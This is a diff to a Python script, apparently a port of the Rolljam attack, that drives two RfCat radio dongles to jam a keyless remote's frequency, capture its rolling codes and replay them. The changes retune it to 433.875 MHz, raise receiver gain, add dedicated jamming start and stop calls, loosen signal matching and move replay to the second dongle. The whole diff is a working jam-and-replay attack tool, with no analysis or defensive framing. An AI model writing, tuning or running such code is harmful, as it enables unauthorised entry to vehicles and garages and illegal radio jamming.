@@ -31,47 +31,55 @@ import time
 import pickle
 
 parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), and Corey Harding.', version="1.0")
-parser.add_argument('-f', action="store", default="315060000", dest="baseFreq", help='Target frequency to listen for remote (default: 315060000)', type=int)
-parser.add_argument('-r', action="store", dest="baudRate", default=1818, help='Baudrate (default: 1818)', type=int)
+parser.add_argument('-f', action="store", default="433875000", dest="baseFreq", help='Target frequency to listen for remote (default: 433875000)', type=int)
+parser.add_argument('-r', action="store", dest="baudRate", default=3200, help='Baudrate (default: 3200)', type=int)
 parser.add_argument('-n', action="store", dest="numSignals", default=2, help='Number of signals to capture before replaying (default: 2)', type=int)
 parser.add_argument('-i', action="store", default="24000", dest="chanWidth", help='Width of each channel (lowest being 24000 -- default)', type=int)
-parser.add_argument('-c', action="store", default="60000", dest="chanBW", help='Channel BW for RX (default: 60000)', type=int)
+parser.add_argument('-c', action="store", default="54000", dest="chanBW", help='Channel BW for RX (default: 60000)', type=int)
 parser.add_argument('-I', action="store", default="", dest="inFile", help='File to read in')
 parser.add_argument('-O', action="store", default="", dest="outFile", help='Output file to save captures to')
-parser.add_argument('-o', action="store", default="-70000", dest="offset", help='Frequency offset of jammer (default: -70000)')
+parser.add_argument('-o', action="store", default="-80000", dest="offset", help='Frequency offset of jammer (default: -70000)')
 parser.add_argument('-p', action="store", default="200", dest="power", help='Power level for re-transmitting (default: 200)', type=int)
 parser.add_argument('-m', action="store", default="-40", dest="minRSSI", help='Minimum RSSI db to accept signal (default: -40)', type=int)
 parser.add_argument('-M', action="store", default="40", dest="maxRSSI", help='Maximum RSSI db to accept signal (default: 40)', type=int)
 parser.add_argument('-k', action="store_true", dest="waitForKeypress", default=False, help='Wait for keypress before resending first capture (default: False)')
 results = parser.parse_args()
 
+jammingFreq = int(results.baseFreq) + int(results.offset)
+
 rawCapture = []
 print "Configuring Scanner on Frequency: " + str(results.baseFreq)
 d = RfCat(idx=0)
+#d.setModeIDLE()
 d.setMdmModulation(MOD_ASK_OOK)
 d.setFreq(results.baseFreq)
-d.setMdmSyncMode(0)
 d.setMdmDRate(results.baudRate)
 d.setMdmChanBW(results.chanBW)
 d.setMdmChanSpc(results.chanWidth)
 d.setChannel(0)
-d.setPower(results.power)
+#d.setPower(results.power)
+d.setAmpMode(RF_RX_POWER_AMPLIFIER_ACTION_ON_RX)
+d.poke(AGCCTRL2, "%c" % 0xf8)
+d.poke(AGCCTRL1, "%c" % 0x70)
 d.lowball(1)
 
-print "Configuring Jammer on Frequency: " + str(int(results.baseFreq) + int(results.offset))
+print "Configuring Jammer on Frequency: " + str(jammingFreq)
 c = RfCat(idx=1)
+#c.setModeIDLE()
 c.setMdmModulation(MOD_ASK_OOK)  # on of key
-c.setFreq(int(results.baseFreq) + int(results.offset))  # frequency
+c.setFreq(jammingFreq)  # frequency
 c.setMdmDRate(results.baudRate)  # how long each bit is transmited for
 c.setMdmChanBW(results.chanBW)  # how wide channel is
 c.setMdmChanSpc(results.chanWidth)
 c.setChannel(0)
 c.setMaxPower()  # max power
-c.lowball(1)  # need inorder to read data
+c.setAmpMode(RF_TX_POWER_AMPLIFIER_ACTION_ON_TX)
+c.lowball(1)  # need in order to read data
 
 time.sleep(1)  # warm up
 
 if(results.inFile != ''):
+    print "Opening file: " + results.inFile
     rawCapture = pickle.load(open(results.inFile, "rb"))
     if(len(rawCapture) == 0):
         print "No captures found"
@@ -89,7 +97,7 @@ if(results.inFile != ''):
             for i in range(0, len(rawCapture)):
                 key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
                 d.makePktFLEN(len(key_packed))
-                raw_input(" Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
+                raw_input("Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
                 d.RFxmit(key_packed)
                 print "Sent " + str(i + 1) + " of " + str(len(rawCapture))
         except KeyboardInterrupt:
@@ -102,24 +110,27 @@ if(results.inFile != ''):
     sys.exit()
 
 print "Jamming...."
-c.setModeTX()  # start transmitting
+#c.setModeTX()  # start transmitting
+c.sendJammingStart(jammingFreq, jammingFreq, results.baudRate, MOD_ASK_OOK)
+raw_input("Press enter to start scanning")
 
 print "Scanning..."
 while True:
     try:
         y, t = d.RFrecv(1)
         sampleString = y.encode('hex')
-        # print sampleString
+        print sampleString
         strength = 0 - ord(str(d.getRSSI()))
 
         #sampleString = re.sub(r'((f)\2{8,})', '',sampleString)
-        if (re.search(r'((0)\2{15,})', sampleString)):
+        #if (re.search(r'((0)\2{15,})', sampleString)):
+        if (re.search(r'((0){8,}[0-9a-f]{32,})', sampleString)):
             print "Signal Strength:" + str(strength)
-            if(strength > results.minRSSI and strength < results.maxRSSI):
-                rawCapture.append(sampleString)
-                print "Found " + str(sampleString)
-                if(len(rawCapture) >= results.numSignals):
-                    break
+            #if(strength > results.minRSSI and strength < results.maxRSSI):
+            rawCapture.append(sampleString)
+            #print "Found " + str(sampleString)
+            if(len(rawCapture) >= results.numSignals):
+                break
 
     except ChipconUsbTimeoutException:
         pass
@@ -132,7 +143,8 @@ if(results.outFile != ''):
     pickle.dump(outputCapture, open(results.outFile, "wb"))
 
 print "Send Phase..."
-# print rawCapture
+print rawCapture
+d.setModeIDLE()
 emptykey = '\x00\x00\x00\x00\x00\x00\x00'
 d.makePktFLEN(len(emptykey))
 d.RFxmit(emptykey)
@@ -142,31 +154,36 @@ if(results.waitForKeypress == True):
     time.sleep(.5)  # Assumes someone using waitForKeypress mode is testing thus they will be pressing button on remote
     # and waiting for the "Done jamming" message, this delay allows their brain to stop pressing the button
     # don't want to accidentally hop to next code
-c.setModeIDLE()  # put dongle in idle mode to stop jamming
+#c.setModeIDLE()  # put dongle in idle mode to stop jamming
+c.sendJammingStop()
 
 if(results.waitForKeypress == True):
-    raw_input(" Press enter to send first capture")
+    raw_input("Press enter to send first capture")
+
 print 'Replaying'
 key_packed = bitstring.BitArray(hex=rawCapture[0]).tobytes()
-d.makePktFLEN(len(key_packed))
-d.RFxmit(key_packed)
+c.setModeIDLE()
+c.setFreq(results.baseFreq) # switch to remote control frequency
+c.makePktFLEN(len(key_packed))
+c.RFxmit(key_packed)
 print "Sent capture 1"
 
-while True:
-    try:
-        for i in range(1, len(rawCapture)):
+try:
+    for i in range(1, len(rawCapture)):
+        key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
+        print "Capture " + str(i + 1) + " of " + str(len(rawCapture)) + ": " + key_packed.encode('hex')
+        raw_input("Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
+        c.setModeIDLE()
+        c.makePktFLEN(len(key_packed))
+        c.RFxmit(key_packed)
+        print "Sent capture " + str(i + 1) + " of " + str(len(rawCapture))
+except KeyboardInterrupt:
+    print "Bye!"
+    d.setModeIDLE()
+    c.setModeIDLE()  # put dongle in idle mode to stop jamming
+    sys.exit()
+    #break
 
-            key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
-            raw_input(" Press enter to send capture " + str(i + 1) + " of " + str(len(rawCapture)))
-            d.makePktFLEN(len(key_packed))
-            d.RFxmit(key_packed)
-            print "Sent capture " + str(i + 1) + " of " + str(len(rawCapture))
-    except KeyboardInterrupt:
-        print "Bye!"
-        d.setModeIDLE()
-        c.setModeIDLE()  # put dongle in idle mode to stop jamming
-        sys.exit()
-        break
 print "exiting."
 d.setModeIDLE()
 c.setModeIDLE()
